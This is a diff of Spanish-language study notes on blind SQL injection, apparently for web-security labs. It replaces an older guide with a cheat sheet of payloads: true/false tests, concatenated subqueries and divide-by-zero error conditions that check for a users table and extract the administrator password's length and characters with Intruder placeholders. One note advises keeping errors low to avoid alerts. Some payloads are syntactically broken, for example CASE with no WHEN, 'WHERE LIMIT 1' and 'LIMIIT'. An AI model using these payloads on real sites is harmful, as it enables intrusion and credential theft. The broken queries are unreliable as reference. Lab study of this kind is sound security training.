@@ -150,138 +150,183 @@ Ejemplo:
 | Netezza             | `SELECT columnname, datatype FROM _v_relation_column WHERE tablename = 'TABLE';`                    |
 | Clustrix            | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
 
-**Blind SQL Guia**
-1. Identifica el parametro inyectable `TrackingId`
-2. Genera un error de sintaxis básico  y ve su coportamiento, ejemplo una comilla simple `TrackingId=xyz'` esto debería generar un error
-3. Ahora dos comillas `TrackingId=xyz''` con esto verificamos que el error anterior se elimina
-4. Se crea un comando de subconsulta `TrackingId=xyz'||(SELECT '')||'` para SQL y para Oracle `TrackingId=xyz'||(SELECT '' FROM dual)||'` 
-- Verificar inyeción en las cookies y verificar su comportamiento con una sentencia Falsa o Verdadero (1=1, 1=0)
-- Identificar posibles tablas y columnas a traves de fuerza bruta
-- Conocer el tamaño del objetivo a enumerar > `' AND (SELECT len(password) from users where username = 'administrator')='§1§'--`
-- Ejecución de un cluster bomb para enumerar datos sensibles > `' AND (SELECT substring(password,§1§,1) from users where username = 'administrator')='§x§'--`
-
-## Identificación SQL Blind
-### Encontrar donde es inyectable 
-Usualmente puede ser una cookie, por lo que las inyecciones serán a través de la modificación de la cookie y actualizando la página
-
-### Encontrar la cantidad de campos
-- A diferencia de una inyección NO BLIND, no es tan relevante ya que aquí no existe información visible, la intención de blind es identificar datos a través del comportamiento de la aplicación, generando errores intencionados para identificar si un dato es verdadero o falso
-- En este tipo de inyección no es tan impportante identificar el tipo de datos ya que solo nos guiaremos a partir del comportamiento, aunque el tipo de dato si debe ser considerado en las consultas que se vayan a realizar
-
-### Base SQL Blind
-La base de SQL blind es la manipulación sin una respuesta especifica, puede ser tambien a traves de la generación de errores intencionados,  es decir se inyectan consultas verdaders y falsas para poder conocer el comportamiento de la aplicación y aprtir de esto generar subconsultas
-- Existen  los errores de logica 1=2
-- Existen errores de aritmeticos 1/0
-- Errores de sintaxis Selet * from dual; substring (1,1 'string')
-
-Los pasos son los siguientes:
-**1** Generación de error de sintaxis y lógica
-```
-Suponiendo la siguiente consulta: SELECT ID FROM TRACKING WHERE ID = 'xyz'
-El valor del ID es xyz
-
-Error básico 1: Añadir una comilla simple ' => xyz' => Esto es un error de sintaxis porque el caracter indica un inicio o cierre de un dato por que estaría incompleto
-  SELECT ID FROM TRACKING WHERE ID = 'xyz''
-Error básico 2: Añadir dos comillas simples ' => xyz' => Esto es como una cadena vacia o un NULL ya que esta indicando el inicio y termino de una cadena vacia
-  SELECT ID FROM TRACKING WHERE ID = 'xyz'''
-
-Errores lógicos para validar
-Error confirmación verdadero ' AND '1'='1  ó ' AND '1'='1'-- => Es importante ver el comportamiento cuando se genera una acción adicional
-  SELECT ID FROM TRACKING WHERE ID = 'xyz AND '1'='1' Ó SELECT ID FROM TRACKING WHERE ID = 'xyz' AND '1'='1'--'
-Error confirmación falso 'AND '1'='2 ó AND ' AND '1'='2'-- => Es importante ver el comportamiento cuando se genera una acción adicional
-  SELECT ID FROM TRACKING WHERE ID = 'xyz'AND '1'='2' ó SELECT ID FROM TRACKING WHERE ID = 'xyz' AND '1'='2'--
-Lo anterior confirmará que el error de sintaxis tiene efecto en la aplciación
-```
-**2**Confirmar que la inyección se interpreta como una consulta, es decir que llega al backend
-```
-Suponiendo la siguiente consulta: SELECT ID FROM TRACKING WHERE ID = 'xyz'
-El valor del ID es xyz
-
-*Imporante se debe considerar que tipo de base de datos se esta utilizando ya que podria existir para que esto sea efectivo, si la sintaxis es correcta y no genera resultados se debe considerar elegir otra sintaxis de otra base de datos o considerar que esta siendo filtrada la salida
-PARA PostgreSQL
-TrackingId=xyz'||(SELECT '')||' => Esto genera una subconsulta vacia
-PARA MS SQL
-TrackingId=xyz'+(SELECT '')+' => Esto genera una subconsulta vacia
-PARA MYSQL
-TrackingId=xyz' (SELECT '') ' => Esto genera una subconsulta vacia
-PARA ORACLE
-TrackingId=xyz'||(SELECT '' FROM dual)||'
-
-Una vez confirmada la consulta, genera una consulta invalida, esto confirmara que el back-end esta procesando la inyeccion como una consulta SQL
-PARA PostgreSQL
-TrackingId=xyz'||(SELECT '' FROM tabla-imaginaria )||' => Esto genera una subconsulta vacia
-```
-**3**Consultas clave
-```
-Intenta siempre generar consulta SQL sintacticamente validas, para obtener información clave utilizando errores para inferir la información clave ejemplos
-
-[Oracle]  TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||' => Si la consulta no devuelve un error se puede inferir que existe, es imporatnte delimitar el numero de columnas de lo contrario romperan la concatenación
-
-[MS SQL]  TrackingId=xyz'||(SELECT '' FROM users WHERE LIMIIT = 1)||' => Si la consulta no devuelve un error se puede inferir que existe, es imporatnte delimitar el numero de columnas de lo contrario romperan la concatenación
-
-```
-
-**4**Consultas clave a través de condiciones
-```
-A través de un operador lógico(=,>,<, etc), se genera una consulta para verificar un dato, puede ser su existencia, hasta la enumeración del mismo
-  TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a                                                            =>Verifica la existencia de un parametro
-  TrackingId=xyz' AND (SELECT 'x' FROM users WHERE username='administrator' and LENGTH(password)=$1$)='x            =>Obtiene la longitud de un parametro
-  TrackingId=xyz' AND (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username='administrator')='$a$             =>Enumera un parametro
-
-A través de un CASE
-  TrackingId=xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
-
-A traves de un IF
-  TrackingId=xyz' AND (SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a'))
-
-```
 
 # SQL Blind
 
 ## Errores de lógica
+### Comparación verdadera
+` 'AND '1'='1 `
+### Comparación falsa
+` 'AND '1'='2 `
+
+<br><br>**Ejemplo** 
 ```
-'AND '1'='1											=>Valor verdadero
-'AND '1'='2											=>Valor falso
+Consulta ideal
+SELECT ID FROM TRACK WHERE TRACKID = 'xyz'
+
+Compración verdadera
+SELECT ID FROM TRACK WHERE TRACKID = 'xyz'AND '1'='1'
+
+Comparación falda
+SELECT ID FROM TRACK WHERE TRACKID = 'xyz'AND '1'='2'
 ```
 ## Subconsultas condicionales
+### Comprobar la existencia de la tabla usuario
+` ' AND (SELECT 'a' FROM users LIMIT 1)='a `
+### Comprobar la existencia del usuario administrador
+` ' AND (SELECT 'a' FROM users WHERE username='administrator')='a `
+### Identificar el tamaño de la contraseña de administrador
+` ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a `
+### Enumeración de la contraseña
+` ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a `
+<br><br>**Ejemplo** 
 ```
-' AND (SELECT 'a' FROM users LIMIT 1)='a																                            =>Verifica la existencia de la tabla usuario
-' AND (SELECT 'a' FROM users WHERE username='administrator')='a											                =>Verifica la existencia del usuario administrador
-' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a					    =>Verifica el tamaño de la contraseña de un admin 
-TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a		=>Enumerar contraseña
+Consulta ideal
+SELECT ID FROM TRACK WHERE TRACKID = 'xyz'
 
-**NOTA** Depues la consulta base se pueden añadir el comentario -- ## ejemplo
-' AND (SELECT 'a' FROM users LIMIT 1)='a--
+Comprobar la existencia de la tabla usuario
+SELECT ID FROM TRACK WHERE TRACKID = 'xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'
 ```
-## Generación de errores de sintaxis básico
+<br><br>**NOTA** Depues la consulta base se pueden añadir el comentario <br>
 ```
-'					=> Error
-''				=> Cadena vacia
+Consulta ideal
+SELECT ID FROM TRACK WHERE TRACKID = 'xyz' AND TTL<24
+
+Sin comentarios
+SELECT ID FROM TRACK WHERE TRACKID = 'xyz' AND (SELECT 'a' FROM users LIMIT 1)='a' AND TTL<24 => No evita las demás validaciones
+
+Sentencia con comentarios
+' AND (SELECT 'a' FROM users LIMIT 1)='a'--
+
+Con comentarios
+SELECT ID FROM TRACK WHERE TRACKID = 'xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'--' AND TTL<24 => Evita las validaciones siguientes
 ```
-## Generación de errores de sintaxis básico
-### Error de sintaxis
+<br><br>**Nota2**: Ctrl + click copia toda la columna de intruder<br>
+
+## Error de sintaxis
+### Comilla simple
 ` ' `
-### Cadena vacia
+### Comilla doble (Cadena vacia)
 ` '' `
-## Generación de errores de sintaxis básico
-### Error de sintaxis ` ' `
-### Cadena vacia ` '' `
-
-## Generación de errores de sintaxis básico
-- Error de sintaxis ` ' `
-- Cadena vacia ` '' `
-
-## Subconsultas concatenadas
+<br><br>**Ejemplo** 
 ```
-'||(SELECT '')||'																														=>Concatenar subconsulta verdadera
-'||(SELECT '' FROM dual)||'																									=>Consulta vacia Oracle
-'||(SELECT '' FROM TablaQueNoExiste)||'																			=>Consulta comporatmiento antes una tabla que no existe 
-'||(SELECT '' FROM users WHERE ROWNUM = 1)||'																=>Verifica la existencia de una tabla y limita la salida a 1 para no recibir de más [Oracle]
-'||(SELECT '' FROM users WHERE LIMIT 1)||'																	=>Verifica la existencia de una tabla y limita la salida a 1 para no recibir de más
-'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'			=>Consulta base de inferencia con sentencia verdadera
-'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'			=>Consulta base de inferencia con sentencia falsa
+Consulta ideal
+SELECT ID FROM TRACK WHERE TRACKID = 'xyz'
+
+Comilla simple (Genera error)
+SELECT ID FROM TRACK WHERE TRACKID = 'xyz''
+
+Comilla doble (Cadena vacia)
+SELECT ID FROM TRACK WHERE TRACKID = 'xyz'''
+```
+## Subconsultas concatenada
+Toda concatenación debe tener en cuenta el tipo de dato de las varibles ya que una concatenación ocurre en un tipo cadena por lo que todo se debe convertir en este tipo de dato por eso es necesario el comando `TO_CHAR(Varible/operacion)`
+### SQL
+` '||(SELECT '')||' `
+### SQL Oracle
+` '||(SELECT '' FROM dual)||' `
+<br><br>**Ejemplo** 
+```
+Consulta ideal
+SELECT ID FROM TRACK WHERE TRACKID = 'xyz'
+
+SQL
+SELECT ID FROM TRACK WHERE TRACKID = 'xyz'||(SELECT '')||''
+
+SQL Oracle
+SELECT ID FROM TRACK WHERE TRACKID = 'xyz'||(SELECT '' FROM dual)||''
+
+```
+## Subconsultas Concatenada aplicadas
+### Verificar una tabla
+`
+No manda error
+'||(SELECT '' FROM TablaExiste)||'  
+Manda error
+'||(SELECT '' FROM TablaQueNoExiste)||'
+`
+### Subconsulta de una tabla para indetificar si cuenta con valores
+``` 
+SQL Oracle 
+'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+
+SQL (Depende el tipo de consulta tambien puede ser admitido en Oracle)
+'||(SELECT '' FROM users WHERE LIMIT 1)||'
+```
+## Error División por Cero 
+### Subconsulta aplicada con Error de División por Cero Verdadera
+```
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END)||'
+```
+### Subconsulta aplicada con Error de División por Cero Falsa
+```
+'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END)||'
+```
+### Subconsulta aplicadas con Error de División por Cero - Verificar la existencia de una tabla
+```
+Se verifica el nombre de la tabla objetivo se espera que no haya errores
+'||(SELECT  CASE  THEN '' ELSE TO_CHAR(1/0) FROM users)||'
+
+Se verifica la hipotesis generando una consulta en una tabla que no exista
+'||(SELECT  CASE  THEN '' ELSE TO_CHAR(1/0) FROM unaTablaQueNoExiste)||'
+```
+### Subconsulta aplicadas con Error de División por Cero - Verificar la existencia de un valor en la tabla
+```
+Es la misma subconsulta realizada de diferentes formas
+Esta consulta primero devuelve valores donde el username sea administrator y si existen ejecuta la operación condicional 1=1
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+Esta consulta además de lo que hace la anterior limita el numero de filas a devolver a 1, la primera esta en SQL Oracle, la otra en SQL
+'||(SELECT CASE WHEN username = 'administrator' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE ROWNUM = 1)||'
+'||(SELECT CASE WHEN username = 'administrator' THEN '' ELSE TO_CHAR(1/0) END FROM users LIMIT 1)||'
+```
+### Subconsulta aplicadas con Error de División por Cero - Verificar la longitud de un valor de un campo de la columna, en este caso la contraseña 
+```
+Todas las subconsultas hacen lo mismo  pero de diferente manera
+'||(SELECT CASE WHEN LENGTH(password)>$1$ THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'					
+'||(select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>$1$)||'
+'||(SELECT CASE ((SELECT 'x' FROM users WHERE username='administrator' and LENGTH(password)=$1$)='x') THEN '' ELSE 1/0 END)||'
+
+Esta es de ChatGPT
+'||(SELECT CASE WHEN LENGTH(password) = $1$ THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator' AND ROWNUM = 1)||'
 ```
 
+### Subconsulta aplicadas con Error de División por Cero - Enumerar campo
+```
+Todas las subconsultas hacen lo mismo  pero de diferente manera
+'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'				
+'||(select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and SUBSTR(password,1,1)='§a§')||'	
+```
+<br><br>**NOTA la condicional del error debe generar la menor cantidad de errores posible para no generar alertas es por eso que la solicitud adecuada es la que genera el error y no al reves**
 
-## Cheat Sheet
+
+## Subconsulta Condicional
+La principal diferencia es que aquí no es necesario convertir todos las variables o resultados a varchar ya que no pertenece a una concatenación de caracteres
+### Subconsulta Condicional - Error Lógico
+```
+' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a																					=>Consulta falsa con adecuado comportamiento
+' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a																					=>Consulta verdadera con error logico incorporado
+```
+### Subconsulta Condicional -  Verificar el nombre de una tabla
+```
+' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END FROM users )'
+' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END FROM tablaQueNoExiste )'
+```
+### Subconsulta Condicional -  Verificar un capo de una tabla
+```
+' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END FROM users WHERE username='administrator')'
+```
+### Subconsulta Condicional -  Verificar la longitud de un valor de un campo de la columna, en este caso la contraseña 
+```
+' AND (SELECT CASE WHEN LENGTH(password)=$1$ THEN 1/0 ELSE '' END FROM users WHERE username='administrator')'
+```
+### Subconsulta Condicional -  Enumerar campo
+```
+' AND (SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN 1/0 ELSE '' END FROM users WHERE username='administrator')'	
+```
+<br><br> **Nota: Ctrl + click copia toda la columna de intruder**
+# Final
+Cheat Sheet
 https://portswigger.net/web-security/sql-injection/cheat-sheet
